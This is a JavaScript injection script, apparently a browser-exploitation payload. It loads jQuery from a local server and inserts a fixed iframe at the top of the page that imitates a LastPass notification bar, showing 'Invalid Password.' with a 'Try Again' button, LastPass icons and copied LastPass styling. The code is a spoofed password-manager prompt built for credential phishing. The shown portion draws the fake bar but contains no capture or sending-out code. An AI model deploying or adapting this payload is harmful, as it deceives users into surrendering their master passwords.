//load in jquery (a little uneccessary possibly for this script)
var script = document.createElement('script');
script.src = "http://127.0.0.1:9000/public/js/jquery-1.9.1.min.js";
script.onload = function () {

var html = '<html>' +
    '<head>' +
    '    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">' +
    '    <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">' +
    '</head>' +
    '' +
    '<body style="background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAIAAAJYCAYAAABIPDecAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAINJREFUWMPtz0EKAjEMheEIBW/h+byKF/QSLtSKzCBOok58HWTo3sWf1cdLSpNy3O7c3lXGCJtxsylxdU9UJQ/LKpPFZobHkiRcM75OwlYz7bn3Wg0R0W31kwbTPoeo+2+Sh30wCnfhIpyEs1CFQXj+bmjLpwAAAAAAAAAAAAAAgH/DC5OFQV7fXlzwAAAAAElFTkSuQmCC) repeat-x;"><img width="16" height="16" data-lpstyle="width:16px;height:16px;display:inline;" src="data:image/gif;base64,R0lGODdhEAAQAPQfAHEAGq9RZp8BJfT09JkCJKUuSO/q6/n//vHh5YYBGvf6+tOyucB0hsuLmpUiOpIAHIgJJtzFy7pneuvT2fP49/Dw8L5/juS+x8Scpn4BHaMDJ3cAHHQAG6YDKP///3gAFiH/C1hNUCBEYXRhWE1QRj94cDI2NkQzRERDQjk3IiB4bXBNTTpJbnN0YW5jZUlEPVJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz4ALAAAAAAQABAAAAWYYCeOZNlpKCoIKptq60p0xVo4RCwQORFMCM3jggjIeLxHwONhFJiMBzL5SDQ8iIln8ehSHYGAZHA4KBrhQre6LA/eZKYlUU0EFBVDBa5XMBKACRAOYBUUhxKEEIAZjRkfCwcRkREQH46OHwEHFAEOFQcWl40bpRwOGAsAH6kFH6WwpQAcEAAbGRy2sBy8vbO5vb4Aw8TFxiEAOw==" style="width: 16px; height: 16px; display: inline;">' +
    '    <div id="lastpass-content" data-lpstyle="color:white;-webkit-user-select:none;" style="color: white; -webkit-user-select: none;">Invalid Password.</div><img width="16" height="16" lptype="close" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABYklEQVR42qXTvWrCUBQHcKe+QqfundPFxT0OnTJ0MtChmw/g4NgH6FtkEwoBv8BEA8EYFGswBIIEhFCrU4V26cfp+Qe5RLlKwcAPknty/7mHe1NoNBoy9+yZJWzBcN3J3j0cuGJJt9ul0WhEYRjSfD4nz/Oo0+kQ10J2eSygyL4xcb1eyyAUIV/sWhawHY/HtFqtTvJ9HyGbw4B6r9ejNE3/ZdfOQz4gnkwmtFwuM7VajRRFIcMwyLIs3GNM1HetePmA9yAIKEkSoVqtUrlcBtzv1abTKQJe9wIwGMexgGd8GQ5rvFoEvOUDFtiqKIoEXddJVdWMpml7Ndd1EfCSD3jC3mPPoVKpUKlUItM0AavAmKi3220E1PMBF+zTcRyazWYn9ft9Qsuyc3DLfm3bRs8y2BFM/mFFWQDcsE2r1SKsZjgcZgaDATWbTUxOxSmUBwiPLGEfOzGrH/uZzlIgorP8ASYfyJK1fcokAAAAAElFTkSuQmCC" id="lphideoverlay" data-lpstyle="width:16px;height:16px;float: right; margin-right: 10px; margin-bottom: -10px;" style="width: 16px; height: 16px; float: right; margin-right: 10px; margin-bottom: -10px;">' +
    '    <button type="button" lptype="tryagainbtn" id="lptryagainbtn" class="lpbutton" value="Try Again">Try Again</button>' +
    '</body>' +
    '<style type="text/css">' +
    '#lastpass-notification {' +
    '    height: 13px;' +
    '    padding: 7px 10px !important;' +
    '    text-align: left;' +
    '    position: relative;' +
    '    font-weight: bold;' +
    '    font-family: Helvetica Neue, Helvetica, Arial, Sans-serif;' +
    '    font-size: 11px;' +
    '    z-index: 1000000099;' +
    '    color: black;' +
    '    vertical-align: top;' +
    '    float: none;' +
    '}' +
    '' +
    '#lastpass-content {' +
    '    display: inline;' +
    '    padding-left: 5px;' +
    '    vertical-align: top;' +
    '    text-align: left;' +
    '    float: none;' +
    '    width: 100%;' +
    '    -webkit-user-select: none;' +
    '    font-family: Helvetica Neue, Helvetica, Arial, sans-serif;' +
    '    font-size: 11px;' +
    '}' +
    '' +
    '.lppopup {' +
    '    position: absolute;' +
    '    -webkit-border-radius: 0px 0px 5px 5px;' +
    '    border-radius: 0px 0px 5px 5px;' +
    '    -webkit-box-shadow: 2px 3px 10px 2px #a6a6a6;' +
    '    box-shadow: 2px 3px 10px 2px #a6a6a6;' +
    '    z-index: 99999;' +
    '    background: #fff;' +
    '    overflow: auto;' +
    '    x: 0px;' +
    '    y: 0px;' +
    '    width: 300px;' +
    '    height: 200px;' +
    '    display: none;' +
    '}' +
    '' +
    '.lppopup table {' +
    '    float: none;' +
    '    display: table;' +
    '    margin: 0px;' +
    '    padding: 0px;' +
    '    border-spacing: 1px;' +
    '}' +
    '' +
    '.lppopup tr:hover {' +
    '    background: -webkit-linear-gradient(top, rgba(214, 249, 255, 1) 0%, rgba(158, 232, 250, 1) 100%);' +
    '    background: -o-linear-gradient(top, rgba(214, 249, 255, 1) 0%, rgba(158, 232, 250, 1) 100%);' +
    '}' +
    '' +
    '.lppopup tr {' +
    '    -webkit-user-select: none;' +
    '    background-color: #fff;' +
    '    height: 22px;' +
    '}' +
    '' +
    '.lppopup td {' +
    '    -webkit-user-select: none;' +
    '    font-size: 11px;' +
    '    font-family: Helvetica Neue, Helvetica, Arial, sans-serif;' +
    '    color: black;' +
    '    cursor: pointer;' +
    '}' +
    '' +
    '.lppopupextended {' +
    '    position: absolute;' +
    '    -webkit-border-radius: 0px 0px 5px 5px;' +
    '    border-radius: 0px 0px 5px 5px;' +
    '    -webkit-box-shadow: 2px 3px 10px 2px #a6a6a6;' +
    '    box-shadow: 2px 3px 10px 2px #a6a6a6;' +
    '    z-index: 99999;' +
    '    background: #fff;' +
    '    x: 0px;' +
    '    y: 0px;' +
    '    width: 410px;' +
    '    height: 200px;' +
    '    display: none;' +
    '    overflow-x: hidden;' +
    '}' +
    '' +
    '.lppopupextended table {' +
    '    float: none;' +
    '    display: table;' +
    '    margin: 0px;' +
    '    padding: 0px;' +
    '    border-spacing: 1px;' +
    '    overflow-x: hidden;' +
    '}' +
    '' +
    '.lppopupextended tr {' +
    '    -webkit-user-select: none;' +
    '    background-color: #fff;' +
    '    height: 22px;' +
    '    overflow-x: hidden;' +
    '}' +
    '' +
    '.lppopupextended td {' +
    '    -webkit-user-select: none;' +
    '    font-size: 11px;' +
    '    font-family: Helvetica Neue, Helvetica, Arial, sans-serif;' +
    '    color: black;' +
    '    cursor: pointer;' +
    '    white-space: normal;' +
    '    overflow-x: hidden;' +
    '}' +
    '' +
    '.lppopupextended th {' +
    '    -webkit-user-select: none;' +
    '    font-size: 11px;' +
    '    font-family: Helvetica Neue, Helvetica, Arial, sans-serif;' +
    '    color: black;' +
    '    background-color: #ececec;' +
    '    cursor: pointer;' +
    '    height: 16px;' +
    '}' +
    '' +
    '.sortable tr:hover {' +
    '    background: -webkit-linear-gradient(top, rgba(214, 249, 255, 1) 0%, rgba(158, 232, 250, 1) 100%);' +
    '    background: -o-linear-gradient(top, rgba(214, 249, 255, 1) 0%, rgba(158, 232, 250, 1) 100%);' +
    '}' +
    '' +
    '.lpopupsearchbox {' +
    '    -webkit-user-select: none;' +
    '    background-color: #fff;' +
    '    height: 22px;' +
    '}' +
    '' +
    '.lpopupsearchbox:hover {' +
    '    -webkit-user-select: none;' +
    '    background-color: #fff;' +
    '    height: 22px;' +
    '}' +
    '' +
    '.lpbutton,' +
    '#lastpass-notification button[type="button"] {' +
    '    background-color: #eeeeee;' +
    '    background-image: -webkit-gradient(linear, left top, left bottom, from(#eeeeee), to(#cccccc));' +
    '    background-image: -webkit-linear-gradient(top, #eeeeee, #cccccc);' +
    '    background-image: -o-linear-gradient(top, #eeeeee, #cccccc);' +
    '    background-image: linear-gradient(top, #eeeeee, #cccccc);' +
    '    border: 1px solid #ccc;' +
    '    border-bottom: 1px solid #bbb;' +
    '    -webkit-border-radius: 3px;' +
    '    border-radius: 3px;' +
    '    color: #333;' +
    '    line-height: 1;' +
    '    font-weight: bold;' +
    '    text-align: center;' +
    '    text-shadow: 0 1px 0 #eee;' +
    '    width: auto;' +
    '    float: right;' +
    '    margin: -2px 5px 2px 2px;' +
    '    height: 17px;' +
    '    padding: 1px 6px !important;' +
    '}' +
    '' +
    '.lpbutton:hover,' +
    '#lastpass-notification button[type="button"]:hover {' +
    '    background-color: #dddddd;' +
    '    background-image: -webkit-gradient(linear, left top, left bottom, from(#dddddd), to(#bbbbbb));' +
    '    background-image: -webkit-linear-gradient(top, #dddddd, #bbbbbb);' +
    '    -o-linear-gradient(top, #dddddd, #bbbbbb);' +
    '    border: 1px solid #bbb;' +
    '    border-bottom: 1px solid #999;' +
    '    cursor: pointer;' +
    '    text-shadow: 0 1px 0 #ddd;' +
    '}' +
    '' +
    '#lastpass-notification img {' +
    '    margin: 0px 0px 0px 0px;' +
    '    padding: 0px 0px 3px 0px;' +
    '}' +
    '' +
    '/*------scrollbar css --------*/' +
    '' +
    '::-webkit-scrollbar {' +
    '        width: 10px;' +
    '        height: 15px;' +
    '}' +
    '' +
    '::-webkit-scrollbar-thumb {' +
    '        width: 10px;' +
    '        background: hsla(0,0%,0%,0.15);' +
    '        -webkit-border-radius: 5px;' +
    '        -webkit-box-shadow:inset -2px 0px 5px hsla(0,0%,0%,0.3), inset 1px 0 0 hsla(0,0%,0%,0.2), inset -1px 0 0 hsla(0,0%,0%,0.2), inset 2px 0 0 hsla(0,0%,100%,0.4);' +
    '}' +
    '' +
    '::-webkit-scrollbar-track {' +
    '        width: 10px;' +
    '        border-style: none;' +
    '        -webkit-box-shadow:inset 2px 0px 5px hsla(0,0%,0%,0.15), inset 1px 0 0 hsla(0,0%,0%,0.2);' +
    '        background-color: hsl(0,0%,93%);' +
    '}' +
    '' +
    '.lppopupextended td, .lppopupextended th {' +
    '  white-space:nowrap;' +
    '  padding-right:5px;' +
    '}' +
    '' +
    'body {' +
    '  overflow:hidden;' +
    '  font-family: sans-serif;' +
    '  font-size: 11px;' +
    '}' +
    '</style>' +
    '</html>';


var closeScript ='<script type="text/javascript">' +
    '  $( "#lpclose" ).click(function(){' +
    '    $("#lp-password-prompt-reveal-modal").hide();' +
    '  });' +
    '</script>';

var closeButton = '<img id="lpclose" width="16" height="16" lptype="close" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABYklEQVR42qXTvWrCUBQHcKe+QqfundPFxT0OnTJ0MtChmw/g4NgH6FtkEwoBv8BEA8EYFGswBIIEhFCrU4V26cfp+Qe5RLlKwcAPknty/7mHe1NoNBoy9+yZJWzBcN3J3j0cuGJJt9ul0WhEYRjSfD4nz/Oo0+kQ10J2eSygyL4xcb1eyyAUIV/sWhawHY/HtFqtTvJ9HyGbw4B6r9ejNE3/ZdfOQz4gnkwmtFwuM7VajRRFIcMwyLIs3GNM1HetePmA9yAIKEkSoVqtUrlcBtzv1abTKQJe9wIwGMexgGd8GQ5rvFoEvOUDFtiqKIoEXddJVdWMpml7Ndd1EfCSD3jC3mPPoVKpUKlUItM0AavAmKi3220E1PMBF+zTcRyazWYn9ft9Qsuyc3DLfm3bRs8y2BFM/mFFWQDcsE2r1SKsZjgcZgaDATWbTUxOxSmUBwiPLGEfOzGrH/uZzlIgorP8ASYfyJK1fcokAAAAAElFTkSuQmCC" id="lphideoverlay" data-lpstyle="width:16px;height:16px;float: right; margin-right: 10px; margin-bottom: -10px;" style="width: 16px; height: 16px; float: right; margin: 3px 10px -10px 10px;">';

drawTimer = setTimeout( function() {
  clearTimeout(drawTimer);
  console.log($('#lp-password-prompt-reveal-modal').length);
  if($('#lp-password-prompt-reveal-modal').length == 0){
    var iframe = document.createElement('iframe');
  	iframe.src = 'data:text/html;charset=utf-8,' + encodeURI(html);
    iframe.style.position = "fixed";
    iframe.style.top = 0;
    iframe.style.left = 0;
    iframe.style.width = "100%";
    iframe.style.height = "30px";
    iframe.style.zIndex = 100000;
    iframe.style.border = "none";
    iframe.id = 'lp-password-prompt-reveal-modal';
    document.body.appendChild(iframe);
    console.log('iframe.contentWindow =', iframe.contentWindow);

    // $( "body" ).prepend(closeButton);
    // $( "body" ).prepend(closeScript);
    // $( "#lpclose" ).click(function(){
    //   $('#lp-password-prompt-reveal-modal').remove();
    // });
  }

}, 0 );



};

document.head.appendChild(script); //or something of the likes

